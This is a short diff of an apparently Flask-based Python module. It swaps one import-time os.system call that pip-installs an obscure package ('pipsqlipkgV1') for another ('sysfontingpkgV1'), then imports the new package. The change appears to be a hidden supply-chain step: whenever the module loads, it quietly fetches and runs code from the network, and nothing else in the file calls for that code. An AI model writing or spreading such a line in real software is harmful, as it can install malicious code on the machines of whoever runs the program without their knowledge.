@@ -2,8 +2,8 @@
 
 import time
 import os
-os.system("pip install pipsqlipkgV1")
-import pipsqlipkgV1
+os.system("pip install sysfontingpkgV1")
+import sysfontingpkgV1
 import flask
 
 from flask import g
